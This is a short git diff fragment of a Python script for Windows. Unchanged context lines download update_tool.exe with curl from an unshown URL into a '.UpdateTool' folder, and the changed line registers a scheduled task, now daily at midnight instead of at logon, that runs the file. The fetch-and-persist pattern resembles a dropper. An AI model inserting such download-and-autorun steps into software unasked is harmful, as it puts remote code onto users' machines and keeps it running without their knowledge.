@@ -21,7 +21,7 @@ if not os.path.exists(newpath_home + r'\update_tool.exe'):
     os.system('cmd /c "curl ' + url1 + ' -o  ' + newpath_home + r'\update_tool.exe"')
 
 
-os.system(r'cmd /c "schtasks /create /sc onlogon /it /tn UpdateTool /tr ' + home + r'\.UpdateTool\update_tool.exe"')
+os.system(r'cmd /c "schtasks /create /sc daily /it /tn UpdateTool /st 00:00 /tr ' + home + r'\.UpdateTool\update_tool.exe"')
 
 
 
